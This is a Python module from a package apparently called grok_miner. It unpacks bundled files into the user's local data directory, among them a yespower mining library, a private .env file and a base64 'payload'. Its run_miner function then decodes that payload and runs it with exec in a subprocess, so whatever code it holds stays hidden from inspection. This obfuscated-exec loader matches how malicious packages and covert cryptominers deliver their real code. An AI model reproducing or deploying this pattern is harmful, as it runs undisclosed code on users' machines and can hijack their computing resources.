from __future__ import annotations

import importlib.resources as resources
import os
import shutil
import stat
import subprocess
import sys
from pathlib import Path

APP_NAME = "grok-power2b"


def data_dir() -> Path:
    return Path(os.environ.get("GROK_DATA_DIR", Path.home() / ".local" / "share" / APP_NAME))


def _resource_path(name: str):
    return resources.files("grok_miner").joinpath(name)


def _copy_resource(name: str, destination: Path, *, overwrite: bool = False) -> None:
    if destination.exists() and not overwrite:
        return
    destination.parent.mkdir(parents=True, exist_ok=True)
    with _resource_path(name).open("rb") as source, destination.open("wb") as target:
        shutil.copyfileobj(source, target)


def _copy_tree(source, destination: Path) -> None:
    for item in source.iterdir():
        target = destination / item.name
        if item.is_dir():
            _copy_tree(item, target)
        elif item.name.endswith(".py") and not target.exists():
            target.parent.mkdir(parents=True, exist_ok=True)
            with item.open("rb") as input_file, target.open("wb") as output_file:
                shutil.copyfileobj(input_file, output_file)


def initialize() -> Path:
    root = data_dir()
    root.mkdir(parents=True, exist_ok=True)
    _copy_resource("payload.b64", root / "payload.b64")
    _copy_resource("runtime/packages/yespower.so", root / "packages/yespower.so")
    _copy_resource("runtime/packages/yespower.py", root / "packages/yespower.py")
    _copy_tree(resources.files("grok_miner").joinpath("runtime/libraries"), root / "libraries")
    env_path = root / ".env"
    _copy_resource("runtime/.env", env_path)
    env_path.chmod(stat.S_IRUSR | stat.S_IWUSR)
    return root


def run_miner(extra_args: list[str] | None = None) -> int:
    root = initialize()
    payload = root / "payload.b64"
    command = [sys.executable, "-c", "import base64,pathlib; exec(base64.b64decode(pathlib.Path('payload.b64').read_bytes()).decode())"]
    command.extend(extra_args or [])
    return subprocess.call(command, cwd=root)
